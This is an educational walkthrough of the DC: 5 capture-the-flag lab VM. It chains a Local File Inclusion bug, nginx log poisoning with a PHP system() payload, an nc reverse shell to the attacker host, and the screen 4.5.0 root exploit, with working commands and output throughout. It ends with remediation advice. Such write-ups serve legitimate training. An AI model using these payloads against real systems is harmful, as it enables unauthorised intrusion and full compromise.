# DC: 5 — VulnHub Walkthrough (Beginner to Intermediate)

DC: 5 is the fifth machine in the DCAU "DC" series. It is a deliberately broken
Debian web server. DC: 5 "kicks it up a notch" from DC: 4: instead of a simple login
brute-force, you must find a **Local File Inclusion (LFI)** bug, turn it into remote
code execution through **log poisoning**, and then escalate to root with a vulnerable
**SUID `screen`** binary. This document explains every step as if you are new to hacking.

| Field | Value |
|---|---|
| Machine | DC: 5 |
| Difficulty | Beginner / Intermediate |
| Author | DCAU (http://www.five86.com/dc-5.html) |
| Released | 21 April 2019 |
| VulnHub Entry | https://vulnhub.com/entry/dc-5,314/ |
| Download | https://vulnhub.com/entry/dc-5,314/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Debian Linux 64-bit (VirtualBox) |

> **Legal note:** Only attack a machine you own or have explicit permission to test.
> This VM is designed to be broken — never point these tools at systems you do not own.

## 0. What you will learn

By the end of this lab you will have practised:

- **Host discovery** — finding the target with `nmap` ping sweeps.
- **Web enumeration** — identifying nginx and mapping the site.
- **Local File Inclusion (LFI)** — tricking a web page into reading files it should not.
- **Log poisoning** — injecting PHP code into a log file, then executing it via LFI.
- **Reverse shells** — turning command execution into an interactive shell.
- **SUID enumeration** — finding root-owned binaries that run as root.
- **Public exploit adaptation** — using Exploit-DB and compiling exploit source yourself.
- **Blue-team thinking** — why each mistake is dangerous and how to prevent it.

The core idea: a small "read a file" bug becomes full remote code execution when a log
file containing your input is executed as a script. Then a single outdated binary gives
you root.

## 1. Reconnaissance — finding the target

Confirm your attacker IP is `192.168.56.10`.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Sweep the subnet for live hosts with `nmap`. The `-sn` flag means "ping scan" — it finds
hosts without scanning ports, which is fast.

```bash
nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
```

The target is `192.168.56.101`.

![Ping sweep finding the target host](images/01-nmap-sweep.png)

> **Why it works:** `-sn` sends ARP/ICMP probes and reports which addresses answer. It is
> the quickest way to discover a machine whose IP you do not know yet.

## 2. Enumeration

Now identify the open ports and the software behind them.

```bash
nmap -sC -sV -p- 192.168.56.101 -oN nmap-full.txt
```

```text
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.17.6
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux
```

Port 80 is a web server; port 111 is RPC (not useful here). (Version numbers vary by build.)

![Full nmap scan showing nginx on port 80](images/02-nmap.png)

Visit the site — a browser or `curl` both work.

```bash
curl -s http://192.168.56.101/ | grep -iE "title|copyright"
```

```text
<title>DC-5</title>
Copyright © 2019
```

The site has several pages (Home, About, Contact, Thank You). There is **no login page
this time** — a key difference from earlier DC boxes. Enumerate directories and files.

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
/index.php            (Status: 200)
/contact.php          (Status: 200)
/thankyou.php         (Status: 200)
/footer.php           (Status: 200)
```

![Browsing the DC-5 web site](images/03-site.png)

### 2.1 Spotting the LFI

Submit the contact form. You land on a page whose URL looks like this:

```text
http://192.168.56.101/thankyou.php?firstname=test&lastname=test&country=australia&subject=test
```

One parameter — `country` (or `file` in some builds) — is used to load a footer file on
the server. Watch the copyright year change on every refresh: that year is being read
from a file. Try swapping the filename for a system file:

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

That is the system's user list! The page is reading whatever file you name.

![Reading /etc/passwd through the LFI](images/04-lfi-passwd.png)

> **Why it works:** The PHP code behind the page does something like
> `include($_GET['file'])` without checking the path. PHP happily reads and includes any
> file the web user can access, including `/etc/passwd`. This is Local File Inclusion.
> Different builds expose the parameter as `country` or `file` — if one does not work,
> try the other.

## 3. Foothold

LFI lets us read files, but we want to *run* code. The trick is **log poisoning**.

### 3.1 Confirm we can read the web log

nginx records every request in a log file. Ask the LFI to read it.

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/var/log/nginx/access.log" | tail -5
```

```text
192.168.56.10 - - [14/Oct/2026:10:22:01 +0000] "GET /thankyou.php?file=/etc/passwd HTTP/1.1" 200 ...
```

We can read the log, and — crucially — **our requests appear inside it**.

![Access log contents retrieved via LFI](images/05-access-log.png)

### 3.2 Poison the log with PHP

Send a request whose User-Agent (or URL) contains a PHP snippet. nginx writes the raw
request — including our code — into `access.log`.

```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" http://192.168.56.101/
```

```text
(server responds normally; the payload is now stored in access.log)
```

Now include the log file through the LFI, and add a `cmd` parameter to run a command.

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/var/log/nginx/access.log&cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have command execution as `www-data`.

> **Why it works:** LFI `include()` executes PHP found inside the included file. The log
> file is not normally PHP, but we planted PHP inside it via our User-Agent string.
> When PHP includes the poisoned log, it runs our `system()` call. This is "log poisoning."

### 3.3 Get an interactive reverse shell

Start a listener on Kali.

```bash
rlwrap nc -lvnp 1234
```

Ask the target to connect back. URL-encode the space in the command (`nc%20...`) so the
web server passes it through cleanly.

```bash
curl -s "http://192.168.56.101/thankyou.php?file=/var/log/nginx/access.log&cmd=nc%20192.168.56.10%201234%20-e%20/bin/sh"
```

```text
listening on [any] 1234 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 45982
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the shell to a full TTY so arrow keys and `Ctrl-C` behave:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/06-reverse-shell.png)

> **Why it works:** `nc -e /bin/sh` tells the target to attach a shell to the outbound
> connection. Because the target initiated the connection, most simple firewalls let it
> through — that is the whole point of a *reverse* shell.

## 4. Privilege escalation

### 4.1 Find SUID binaries

SUID (Set Owner User ID) files run with the privileges of their owner. If the owner is
root, the program runs as root.

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/sudo
/usr/bin/passwd
/bin/su
/bin/screen-4.5.0
/usr/bin/mount
...
```

`/bin/screen-4.5.0` stands out. The version string is the giveaway.

![SUID scan highlighting /bin/screen-4.5.0](images/07-suid.png)

### 4.2 Exploit screen 4.5.0

GNU `screen` 4.5.0 has a known local privilege-escalation bug (**CVE-2017-5618**).
Exploit-DB entries **41154** and **41152** demonstrate it. The 41154 script builds a
shared library and a helper that uses screen's logfile feature to write to a root
directory, then loads the library with elevated privileges.

Copy the exploit from SearchSploit inside the shell or download it on Kali, then host it:

```bash
# on Kali: fetch the exploit
searchsploit -m linux/local/41154.sh
# start a simple web server in the folder holding the exploit
python3 -m http.server 4567
```

On the target, download it into `/tmp`:

```bash
cd /tmp
wget http://192.168.56.10:4567/41154.sh
chmod +x 41154.sh
```

The one-shot script sometimes fails, so a reliable approach is to build its two C files
by hand. Extract `libhax.c` and `rootshell.c` from the script and compile them:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
```

Then run the three-part steps (from the exploit's own script):

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

You are root.

> **Why it works:** screen 4.5.0 lets a low-privileged user write to `/etc/ld.so.preload`
> through its logging feature. Anything listed there is loaded by every future program,
> including root programs. Our `libhax.so` turns on a setuid flag so `rootshell` runs as
> root. Classic SUID-plus-outdated-software escalation.

### 4.3 Read the flag

```bash
cd /root
ls
cat thisistheflag.txt
```

```text
You made it. Flag: ...
```

(Confirm the exact flag filename on your build — older builds use `/root/thisistheflag.txt`.)

![Root shell and flag](images/08-root-flag.png)

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
|---|---|---|---|---|
| 1 | Local File Inclusion | `thankyou.php?file=` parameter | Read any file the web user can read | Validate/allow-list includes; disable `allow_url_include`; use fixed paths |
| 2 | Log poisoning → RCE | nginx `access.log` + LFI | Remote code execution as `www-data` | Never log raw user input into an executed path; sanitise/disable includes of logs |
| 3 | SUID vulnerable binary | `/bin/screen-4.5.0` (CVE-2017-5618) | Local privilege escalation to root | Patch/replace old `screen`; minimise SUID binaries |
| 4 | World-writable sensitive file path | screen writes `/etc/ld.so.preload` | Persistent root load of attacker library | Correct file permissions; monitor `ld.so.preload` |
| 5 | Weak file permissions in web root | LFI can reach system files | Information disclosure (users, configs) | Harden web user's file access; chroot/jail the app |

## 6. Defensive lessons (blue team)

- **Never include a file based on user input.** Map friendly names to fixed paths and
  reject anything else. This single rule kills LFI.
- **Treat logs as untrusted data.** Logs contain whatever an attacker sends. They must
  never be executed or included by a scripting engine.
- **Patch and inventory SUID binaries.** Run `find / -perm -u=s -type f` yourself. Any
  root-owned SUID program is a potential escalation. Remove the ones you do not need.
- **Watch `/etc/ld.so.preload`.** It should almost always be empty or absent. A new entry
  is a strong compromise indicator.
- **Run the web app with least privilege** in a sandbox, so reading `/etc/passwd` and
  writing to system paths is impossible.
- **Egress filtering.** The reverse shell is an outbound connection from the server to
  your host; block unexpected outbound traffic.

## 7. References

- VulnHub entry — https://vulnhub.com/entry/dc-5,314/
- DCAU series home — http://www.five86.com/dc-5.html
- Exploit-DB 41154 (screen 4.5.0) — https://www.exploit-db.com/exploits/41154
- Exploit-DB 41152 (screen 4.5.0) — https://www.exploit-db.com/exploits/41152
- CVE-2017-5618 (screen LPE) — https://nvd.nist.gov/vuln/detail/CVE-2017-5618
- GTFOBins (SUID/sudo abuse) — https://gtfobins.github.io/
- OWASP Local File Inclusion — https://owasp.org/www-community/vulnerabilities/File_Include
- bzyo DC-5 walkthrough — https://bzyo.github.io/dc-5/

## 8. Screenshot checklist

Capture these as you go so your write-up is verifiable:

- [ ] `images/01-nmap-sweep.png` — ping sweep finding `192.168.56.101`
- [ ] `images/02-nmap.png` — full nmap scan showing nginx on port 80
- [ ] `images/03-site.png` — the DC-5 web site
- [ ] `images/04-lfi-passwd.png` — `/etc/passwd` read via the LFI
- [ ] `images/05-access-log.png` — nginx access log retrieved via LFI
- [ ] `images/06-reverse-shell.png` — `www-data` reverse shell
- [ ] `images/07-suid.png` — SUID scan showing `/bin/screen-4.5.0`
- [ ] `images/08-root-flag.png` — root shell and flag contents
